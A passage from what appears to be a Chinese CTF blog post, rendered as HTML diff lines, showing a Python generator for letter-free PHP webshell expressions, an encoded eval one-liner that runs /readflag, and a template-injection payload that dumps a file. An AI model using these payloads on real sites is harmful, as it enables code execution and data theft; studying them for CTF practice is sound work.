+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((8).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((9).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((-10).(0))&#123;0&#125;)&quot;</span>&#125;);
+recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1.1).(0))&#123;1&#125;)&quot;</span>&#125;);
+
+loop = <span class="hljs-number">0</span>;
+<span class="hljs-keyword">while</span> loop &lt; <span class="hljs-number">20</span>:
+    loop+=<span class="hljs-number">1</span>
+    <span class="hljs-keyword">for</span> i in result:
+        <span class="hljs-keyword">for</span> j in result:
+            k = chr(ord(i)|ord(j))
+            <span class="hljs-keyword">if</span> k not in result <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&lt;=ord(k)&lt;=<span class="hljs-number">256</span>:
+                result.append(k);
+                recipe = &#123;<span class="hljs-string">&quot;char&quot;</span>:k,<span class="hljs-string">&quot;first&quot;</span>:i,<span class="hljs-string">&quot;second&quot;</span>:j,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>&#125;
+                recipes.append(recipe)
+                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],recipe[<span class="hljs-string">&#x27;first&#x27;</span>],recipe[<span class="hljs-string">&#x27;method&#x27;</span>],recipe[<span class="hljs-string">&#x27;second&#x27;</span>])
+                <span class="hljs-keyword">print</span>(result)
+    <span class="hljs-keyword">for</span> i in result:
+        <span class="hljs-keyword">for</span> j in result:
+            k = chr(ord(i)&amp;ord(j))
+            <span class="hljs-keyword">if</span> k not in result <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>&lt;=ord(k)&lt;=<span class="hljs-number">256</span>:
+                result.append(k);
+                recipe = &#123;<span class="hljs-string">&quot;char&quot;</span>:k,<span class="hljs-string">&quot;first&quot;</span>:i,<span class="hljs-string">&quot;second&quot;</span>:j,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>&#125;
+                recipes.append(recipe)
+                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],recipe[<span class="hljs-string">&#x27;first&#x27;</span>],recipe[<span class="hljs-string">&#x27;method&#x27;</span>],recipe[<span class="hljs-string">&#x27;second&#x27;</span>])
+                <span class="hljs-keyword">print</span>(result)
+
+def findRecipe(i):
+    <span class="hljs-keyword">if</span> i not in result:
+        raise <span class="hljs-built_in">Exception</span>(i);
+    <span class="hljs-keyword">for</span> recipe in recipes:
+        <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;char&#x27;</span>] == i:
+            <span class="hljs-keyword">return</span> recipe;
+def makeRecipe(recipe):
+    <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;method&#x27;</span>] == <span class="hljs-literal">null</span>:
+        <span class="hljs-keyword">return</span> recipe[<span class="hljs-string">&#x27;make&#x27;</span>];
+    <span class="hljs-keyword">else</span>:
+        first = recipe[<span class="hljs-string">&#x27;first&#x27;</span>];
+        second = recipe[<span class="hljs-string">&#x27;second&#x27;</span>];
+        method = recipe[<span class="hljs-string">&#x27;method&#x27;</span>];
+        first = makeRecipe(findRecipe(first));
+        second = makeRecipe(findRecipe(second));
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;%s=(%s%s%s)&quot;</span> % (recipe[<span class="hljs-string">&#x27;char&#x27;</span>],first,method,second)
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;(%s%s%s)&quot;</span> % (first,method,second)
+
+<span class="hljs-comment">#填写要拼的字符串</span>
+target = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;
+result1=<span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">for</span> i in target:
+    <span class="hljs-keyword">if</span> i not in result:
+        raise <span class="hljs-built_in">Exception</span>(i);
+    <span class="hljs-keyword">for</span> recipe in recipes:
+        <span class="hljs-keyword">if</span> recipe[<span class="hljs-string">&#x27;char&#x27;</span>] == i:
+            result1+=makeRecipe(recipe);
+            result1+=<span class="hljs-string">&quot;.&quot;</span>;
+            <span class="hljs-keyword">break</span>;
+<span class="hljs-keyword">print</span>(result1);</code></pre>
+
+<p>加一个做算数的东西,也是这题</p>
+<p><code>php -r &quot;eval(base64_decode(&#39;JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K&#39;));&quot;</code></p>
+<h1 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h1><p>keys={if:1)show_source(hex2bin(base_convert(203581841767,10,16)));die();//}{end if}</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/">无字母数字webshell</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/26/SWPU2019-Web4/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[SWPU2019]Web4</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/16/htaccess%E5%92%8Cuser-ini/">
+                        <span class="hidden-mobile">.htaccess的一些知识点</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
